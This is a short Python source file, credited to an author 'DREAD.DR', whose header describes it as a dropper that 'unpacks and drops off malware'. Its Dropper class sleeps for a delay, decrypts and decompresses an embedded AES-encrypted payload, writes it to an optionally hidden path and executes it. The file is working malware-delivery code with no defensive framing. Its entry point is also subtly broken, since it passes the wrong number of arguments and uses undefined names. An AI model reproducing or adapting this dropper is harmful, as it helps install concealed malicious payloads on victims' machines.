# Date: 05/11/2022
# Author: DREAD.DR
# Description: Unpacks and drops off malware

import os
import zlib
from time import sleep
from lib.file import File
from lib.aes import CryptoAES
from lib.pathfinder import Finder


class Dropper:

    def __init__(self, name, binary, key, delay, hide=False):
        self.key = key
        self.path = None
        self.name = name
        self.hide = hide
        self.delay = delay
        self.binary = binary

    def unpack(self):
        self.path = Finder.find() + self.name if self.hide else self.name
        print('Path1:', self.path)

        # Payload
        data = zlib.decompress(CryptoAES.decrypt(self.binary, self.key))
        File.write(self.path, data)

    def execute(self):
        from subprocess import Popen
        cmd = '{}'.format(self.path)
        Popen(cmd.split())

    def start(self):
        sleep(self.delay)
        self.unpack()
        self.execute()


if __name__ == '__main__':
    Dropper(data_name, data_binary, data_key, data_hide).start()
